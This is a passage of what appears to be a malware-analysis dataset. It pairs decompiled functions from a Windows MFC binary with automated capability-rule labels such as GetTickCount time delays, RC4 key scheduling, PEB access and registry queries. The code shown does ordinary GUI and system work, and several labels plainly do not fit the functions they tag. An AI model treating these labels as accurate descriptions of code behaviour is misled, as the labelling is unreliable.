        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nbool __cdecl\nfcn.00410b1d(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint var_8h;\n    uint var_10h;\n    uint var_10h_2;\n    uint var_14h_2;\n    uint var_18h_2;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = &var_18h;\n    piVar4 = *(extraout_ECX + 0x1c);\n    *(unaff_EBP + -0x14) = 0;\n    iVar1 = *piVar4;\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    iVar1 = (**(iVar1 + 0x128))(extraout_ECX, unaff_EBP + -0x14, *(unaff_EBP + 0x20), *(unaff_EBP + 0xc));\n    if ((iVar1 != 0) && (*(unaff_EBP + -0x14) == 0)) {\n        iVar1 = fcn.00438818();\n        uVar2 = (**(**(iVar1 + 0x1038) + 0xc))(extraout_ECX);\n        *(unaff_EBP + -0x14) = uVar2;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x14) == NULL) {\n        bVar5 = false;\n    }\n    else {\n        iVar1 = (**(**(unaff_EBP + -0x14) + 0x50))\n                          (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                           *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), *(unaff_EBP + 0x20), *(unaff_EBP + 0x24), \n                           *(unaff_EBP + 0x28), *(unaff_EBP + 0x2c));\n        bVar5 = -1 < iVar1;\n        if (bVar5) {\n            puVar3 = fcn.0042f804(0xc);\n            if (puVar3 == NULL) {\n                puVar3 = NULL;\n            }\n            else {\n                iVar1 = *(unaff_EBP + -0x14);\n                uVar2 = *(iVar1 + 0x20);\n                puVar3[2] = 0;\n                *puVar3 = uVar2;\n                puVar3[1] = iVar1;\n            }\n            fcn.0042a334(puVar3);\n            iVar1 = *(unaff_EBP + -0x14);\n            if (*(iVar1 + 0x20) != 0) {\n                piVar4 = fcn.0042a802(*(iVar1 + 0x20));\n                *piVar4 = iVar1;\n                iVar1 = *(unaff_EBP + -0x14);\n            }\n            if (*(unaff_EBP + 0x30) != NULL) {\n                **(unaff_EBP + 0x30) = iVar1;\n            }\n        }\n        else if (*(unaff_EBP + -0x14) != NULL) {\n            (**(**(unaff_EBP + -0x14) + 4))(1);\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return bVar5;\n}\n",
        "token_count": 970
    },
    "004117f5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.004117f5(uint16_t param_1)\n\n{\n    if ((param_1 & 0x4000) != 0) {\n        return 4;\n    }\n    if ((param_1 & 0x2000) != 0) {\n        return 4;\n    }\n    if ((param_1 & 0x1000) != 0) {\n        return 2;\n    }\n    if (0x48 < param_1) {\n        if ((param_1 != 0x80) && (param_1 != 0x81)) {\n            if (param_1 == 0x82) {\n                return 2;\n            }\n            if (param_1 != 0x83) {\n                if (param_1 == 0x85) {\n                    return 2;\n                }\n                if (param_1 == 0x86) {\n                    return 2;\n                }\n                if (param_1 == 0x87) {\n                    return 2;\n                }\n                return 8;\n            }\n        }\ncode_r0x00411852:\n        return 1;\n    }\n    if (param_1 == 0x48) {\ncode_r0x00411827:\n        return 4;\n    }\n    // switch table (20 cases) at 0x411853\n    switch(param_1) {\n    case 2:\n    case 0xb:\n    case 0x12:\n        return 2;\n    case 3:\n    case 4:\n    case 8:\n    case 9:\n    case 10:\n    case 0xd:\n    case 0x13:\n        goto code_r0x00411827;\n    default:\n        return 8;\n    case 0x10:\n    case 0x11:\n    case 0x14:\n    case 0x15:\n        goto code_r0x00411852;\n    }\n}\n",
        "token_count": 415
    },
    "0041447c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041447c(int32_t param_1)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (*(param_1 + 0x48) == 0) {\n        if (*(param_1 + 0x38) != 0) {\n            var_10h = *(param_1 + 0x40);\n            var_ch = 0;\n            var_8h = 0;\n            var_18h = 1;\n            var_14h = 0;\n            uVar1 = (**(**(param_1 + 8) + 0x20))(*(param_1 + 8), 1, 0x44431c, 0, 0, &var_18h);\n            return uVar1;\n        }\n    }\n    else if ((*(param_1 + 0x50) != 0) && (*(*(param_1 + 0x50) + 0xc) != 0)) {\n        uVar1 = fcn.00413df1();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "004309ab": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint fcn.004309ab(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    uVar2 = 0;\n    iVar1 = *(extraout_ECX + 0xc);\n    *(unaff_EBP + -0x10) = &var_14h;\n    if (iVar1 != 0) {\n        *(unaff_EBP + -0x14) = 0;\n        *(unaff_EBP + -4) = 0;\n        uVar2 = (**(extraout_ECX + 0xc))();\n        *(unaff_EBP + -0x14) = uVar2;\n        uVar2 = *(unaff_EBP + -0x14);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 270
    },
    "0043356e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043356e(uint hWnd, uint lpString2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpString1;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString2);\n    if (uVar1 < 0x101) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, &lpString1, 0x100);\n        if (uVar2 == uVar1) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&lpString1, lpString2);\n            if (iVar3 == 0) goto code_r0x004335c9;\n        }\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(hWnd, lpString2);\ncode_r0x004335c9:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 233
    },
    "00434c29": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00434c29(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = fcn.004309ab();\n    if (piVar1 != NULL) {\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        iVar2 = (**(*piVar1 + 0x54))(0, 0, 0x50800000, &var_14h, var_4h, arg_ch, arg_8h);\n        if (iVar2 != 0) {\n            uVar3 = fcn.0042ec17();\n            if ((uVar3 & 0x200) == 0) {\n                return piVar1;\n            }\n            fcn.0042ec31(0x200, 0, 0x20);\n            return piVar1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 269
    },
    "00435156": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435156(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint32_t uVar6;\n    uint var_10ch;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    uVar3 = (*_sym.imp.USER32.dll_SetActiveWindow)(*(in_ECX + 0x1c));\n    fcn.0042cb01(uVar3);\n    pcVar2 = _sym.imp.SHELL32.dll_DragQueryFileA;\n    uVar6 = 0;\n    uVar4 = (*_sym.imp.SHELL32.dll_DragQueryFileA)(arg_8h, 0xffffffff, 0, 0);\n    iVar5 = fcn.00438818();\n    piVar1 = *(iVar5 + 4);\n    if (uVar4 != 0) {\n        do {\n            (*pcVar2)(arg_8h, uVar6, &var_108h, 0x104);\n            (**(*piVar1 + 0x88))(&var_108h);\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < uVar4);\n    }\n    (*_sym.imp.SHELL32.dll_DragFinish)(arg_8h);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 341
    },
    "0043531b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043531b(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    sub.USER32.dll_UnpackDDElParam(1000, arg_ch, &var_214h, &var_210h);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(var_210h);\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar1);\n    if (uVar2 < 0x208) {\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(var_210h);\n        uVar1 = sub.USER32.dll_ReuseDDElParam(arg_ch, 1000, 0x3e4, 0x8000, var_210h);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x3e4, *(in_ECX + 0x1c), uVar1);\n        iVar3 = fcn.0042ecf6();\n        if (iVar3 != 0) {\n            iVar3 = fcn.00438818();\n            (**(**(iVar3 + 4) + 0xa0))(&var_20ch);\n        }\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 346
    },
    "004390b3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004390b3(void)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)(&var_18h);\n    (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar1);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 99
    },
    "00417caa": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417caa(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*arg_8h < 0x76c) {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n    }\n    else {\n        fcn.00417c4a(*arg_8h, arg_8h[1], arg_8h[3], arg_8h[4], arg_8h[5], arg_8h[6], arg_ch);\n        *in_ECX = in_ECX;\n        in_ECX[1] = in_ECX;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "00432a17": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: nWidth\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: nHeight\n\nvoid __cdecl fcn.00432a17(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    uint var_52h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint hdc;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x3c) = vtable.CDC.0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x4c) = vtable.CDC.0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x1c) = vtable.CBitmap.0;\n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    *(unaff_EBP + -4) = 2;\n    uVar2 = (*pcVar1)(0x14);\n    fcn.004329cd(uVar2);\n    *(unaff_EBP + -4) = 3;\n    uVar2 = (*pcVar1)(0x10);\n    fcn.004329cd(uVar2);\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    uVar2 = (*pcVar1)(0);\n    iVar3 = fcn.00432570(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = (*pcVar1)(0);\n        iVar3 = fcn.00432570(uVar2);\n        if (iVar3 != 0) {\n            iVar3 = *(unaff_EBP + 8);\n            (*_sym.imp.GDI32.dll_GetObjectA)(*(iVar3 + 4), 0x18, unaff_EBP + -100);\n            fcn.004328ae();\n            uVar2 = *(unaff_EBP + -0x60);\n            iVar4 = fcn.0040e6fc(uVar2, *(unaff_EBP + -0x5c), *(unaff_EBP + -0x54), *(unaff_EBP + -0x52), 0);\n            if (iVar4 != 0) {\n                uVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(*(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), 1, 1, 0);\n                iVar4 = fcn.00432857();\n                if (iVar4 != 0) {\n                    uVar2 = fcn.004328e0(*(unaff_EBP + -0x38), *(iVar3 + 4));\n                    *(unaff_EBP + 8) = uVar2;\n                    uVar2 = *(unaff_EBP + -0x48);\n                    iVar3 = fcn.004328e0(uVar2, *(unaff_EBP + -0x18));\n                    *(unaff_EBP + -0x14) = iVar3;\n                    if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                        uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x38), 0, 0);\n                        uVar2 = fcn.00432062(uVar2);\n                        pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                        *(unaff_EBP + -0x10) = uVar2;\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0xcc0020);\n                        fcn.00432062(0xffffff);\n                        (*pcVar1)(*(unaff_EBP + -0x48), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                  *(unaff_EBP + -0x38), 0, 0, 0x1100a6);\n                        if (*(unaff_EBP + 0xc) == 0) {\n                            uVar2 = 0;\n                        }\n                        else {\n                            uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                        }\n                        iVar3 = fcn.004328e0(*(unaff_EBP + -0x38), uVar2);\n                        if (iVar3 != 0) {\n                            fcn.00436ed6(0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), *(unaff_EBP + 0x10));\n                            fcn.00432062(0xffffff);\n                            uVar2 = fcn.00432933(unaff_EBP + -0x2c);\n                            *(unaff_EBP + 0xc) = uVar2;\n                            (*pcVar1)(*(unaff_EBP + -0x38), 1, 1, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.00432933(unaff_EBP + -0x24);\n                            (*pcVar1)(*(unaff_EBP + -0x38), 0, 0, *(unaff_EBP + -0x60), *(unaff_EBP + -0x5c), \n                                      *(unaff_EBP + -0x48), 0, 0, 0xe20746);\n                            fcn.00432933(*(unaff_EBP + 0xc));\n                            fcn.00432062(*(unaff_EBP + -0x10));\n                        }\n                        fcn.004328e0(*(unaff_EBP + -0x48), *(*(unaff_EBP + -0x14) + 4));\n                        uVar2 = *(*(unaff_EBP + 8) + 4);\n                        fcn.004328e0(*(unaff_EBP + -0x38), uVar2);\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -0x24) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 3;\n    fcn.004328ae(uVar2);\n    *(unaff_EBP + -0x2c) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.004328ae();\n    *(unaff_EBP + -0x1c) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 1;\n    fcn.004328ae();\n    *(unaff_EBP + -4) = 0;\n    fcn.004325d8();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004325d8();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1873
    },
    "00432c9b": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpvObject\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_66h\n// WARNING: Variable defined which should be unmapped: lprc\n\nvoid __cdecl fcn.00432c9b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpvObject;\n    uint var_74h;\n    uint var_70h;\n    uint var_66h;\n    uint lprc;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint hdc;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint hDC;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint hbr;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x40) = vtable.CDC.0;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x50) = vtable.CDC.0;\n    *(unaff_EBP + -0x4c) = 0;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x30) = vtable.CDC.0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = vtable.CBitmap.0;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x20) = vtable.CBrush.0;\n    pcVar1 = _sym.imp.GDI32.dll_CreateCompatibleDC;\n    *(unaff_EBP + -4) = 4;\n    uVar2 = (*pcVar1)(0);\n    iVar3 = fcn.00432570(uVar2);\n    if (iVar3 != 0) {\n        uVar2 = (*pcVar1)(0);\n        iVar3 = fcn.00432570(uVar2);\n        if (iVar3 != 0) {\n            uVar2 = (*pcVar1)(0);\n            iVar3 = fcn.00432570(uVar2);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.GDI32.dll_GetObjectA)(*(*(unaff_EBP + 8) + 4), 0x18, unaff_EBP + -0x78);\n                if (iVar3 != 0) {\n                    fcn.004328ae();\n                    iVar3 = fcn.0040e6fc(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), *(unaff_EBP + -0x68), \n                                         *(unaff_EBP + -0x66), 0);\n                    pcVar1 = _sym.imp.GDI32.dll_CreateBitmap;\n                    if (iVar3 != 0) {\n                        uVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, 0x43e834);\n                        fcn.00432857(uVar2);\n                        fcn.0040e6db(unaff_EBP + -0x18);\n                        fcn.004328ae();\n                        uVar2 = (*pcVar1)(*(unaff_EBP + -0x74), *(unaff_EBP + -0x70), 1, 1, 0);\n                        fcn.00432857(uVar2);\n                        uVar2 = fcn.004328e0(*(unaff_EBP + -0x3c), *(*(unaff_EBP + 8) + 4));\n                        *(unaff_EBP + 8) = uVar2;\n                        iVar3 = fcn.004328e0(*(unaff_EBP + -0x4c), *(unaff_EBP + -0x14));\n                        *(unaff_EBP + -0x10) = iVar3;\n                        if ((*(unaff_EBP + 8) != 0) && (iVar3 != 0)) {\n                            uVar2 = (*_sym.imp.GDI32.dll_GetPixel)(*(unaff_EBP + -0x3c), 0, 0);\n                            uVar2 = fcn.00432062(uVar2);\n                            pcVar1 = _sym.imp.GDI32.dll_BitBlt;\n                            (*_sym.imp.GDI32.dll_BitBlt)\n                                      (*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                       *(unaff_EBP + -0x3c), 0, 0, 0xcc0020);\n                            fcn.00432062(0xffffff);\n                            (*pcVar1)(*(unaff_EBP + -0x4c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                      *(unaff_EBP + -0x3c), 0, 0, 0xee0086);\n                            fcn.00432062(uVar2);\n                            if (*(unaff_EBP + 0xc) == 0) {\n                                uVar2 = 0;\n                            }\n                            else {\n                                uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                            }\n                            iVar3 = fcn.004328e0(*(unaff_EBP + -0x2c), uVar2);\n                            *(unaff_EBP + 0xc) = iVar3;\n                            if (iVar3 == 0) {\n                                uVar2 = 0;\n                            }\n                            else {\n                                uVar2 = fcn.004320bf(*(unaff_EBP + 0x10));\n                                uVar4 = fcn.00432062(*(unaff_EBP + 0x14));\n                                *(unaff_EBP + 0x14) = uVar4;\n                                *(unaff_EBP + -0x58) = *(unaff_EBP + -0x74);\n                                *(unaff_EBP + -0x54) = *(unaff_EBP + -0x70);\n                                *(unaff_EBP + -0x60) = 0;\n                                *(unaff_EBP + -0x5c) = 0;\n                                (*_sym.imp.USER32.dll_FillRect)\n                                          (*(unaff_EBP + -0x2c), unaff_EBP + -0x60, *(unaff_EBP + -0x1c));\n                                fcn.004320bf(uVar2);\n                                fcn.00432062(*(unaff_EBP + 0x14));\n                                (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                          *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                                (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                          *(unaff_EBP + -0x4c), 0, 0, 0x8800c6);\n                                (*pcVar1)(*(unaff_EBP + -0x2c), 0, 0, *(unaff_EBP + -0x74), *(unaff_EBP + -0x70), \n                                          *(unaff_EBP + -0x3c), 0, 0, 0x660046);\n                                uVar2 = *(*(unaff_EBP + 0xc) + 4);\n                            }\n                            fcn.004328e0(*(unaff_EBP + -0x2c), uVar2);\n                            fcn.004328e0(*(unaff_EBP + -0x4c), *(*(unaff_EBP + -0x10) + 4));\n                            fcn.004328e0(*(unaff_EBP + -0x3c), *(*(unaff_EBP + 8) + 4));\n                        }\n                    }\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -0x20) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 3;\n    fcn.004328ae();\n    *(unaff_EBP + -0x18) = vtable.CGdiObject.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.004328ae();\n    *(unaff_EBP + -4) = 1;\n    fcn.004325d8();\n    *(unaff_EBP + -4) = 0;\n    fcn.004325d8();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004325d8();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 2288
    },
    "00438422": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** fcn.00438422(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0042f302();\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CWinThread.0;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    fcn.004383c9();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 193
    },
    "00438142": {
        "rules": [
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: phkResult\n// WARNING: Variable defined which should be unmapped: var_120h\n// WARNING: Variable defined which should be unmapped: var_11ch\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00438142(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, uint noname_73, \n            uint noname_74, uint lpSubKey)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint hKey;\n    uint var_ch_2;\n    uint var_14h;\n    uint var_10h;\n    uint phkResult;\n    uint var_120h;\n    uint var_11ch;\n    uint in_stack_fffffee4;\n    uint in_stack_fffffee8;\n    uint in_stack_fffffeec;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint in_stack_ffffff20;\n    uint in_stack_ffffff24;\n    uint in_stack_ffffff28;\n    uint in_stack_ffffff2c;\n    uint in_stack_ffffff30;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint in_stack_ffffff74;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint in_stack_ffffff94;\n    uint in_stack_ffffff98;\n    uint in_stack_ffffff9c;\n    uint in_stack_ffffffa0;\n    uint in_stack_ffffffa4;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint in_stack_ffffffe0;\n    uint in_stack_ffffffe4;\n    uint var_14h_2;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x14) = *0x44d270;\n    uVar1 = **(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x10) = &phkResult;\n 